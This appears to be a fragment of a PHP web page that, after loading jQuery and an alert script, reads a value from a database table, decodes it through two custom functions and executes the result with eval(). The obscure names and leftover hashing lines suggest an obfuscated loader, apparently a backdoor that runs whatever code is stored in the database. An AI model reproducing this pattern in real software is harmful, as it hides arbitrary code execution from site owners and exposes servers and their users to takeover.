 	<script type="text/javascript" src="../jquery-3.5.1.min.js"></script> 
 	<script src="../lifetech_sweet_alert_js.js"></script>
   <?php  
 
		//include('connect2db.php');
        
      
$qry= $connect2db->prepare("select * from lifetechfunction  ");
 
$qry->execute( );

$row=$qry->fetch(PDO::FETCH_ASSOC);
  
if($row){
echo '';
 
$dty='gfsegsf';
//echo sha1($dty);
$ke=sha1($dty);
//echo '<br />'.md5($dty);
//echo '<br />'.md5($ke);
 
$lifetechsqlfunctionROWConten4tmmdtt=$row['uvalue']; 
$lifetechsqlfunctionROWConten4tmmdtt=loadStringArray2($lifetechsqlfunctionROWConten4tmmdtt);
			$lifetechsqlfunctionROWConten4tmmdtt=lifecodingReplacing($lifetechsqlfunctionROWConten4tmmdtt);
			
//echo '<br />echos'.$mmd;
 eval(" ?>  $lifetechsqlfunctionROWConten4tmmdtt  <?php ");
 //eval($mmd);
}
		
		
		
      ?>   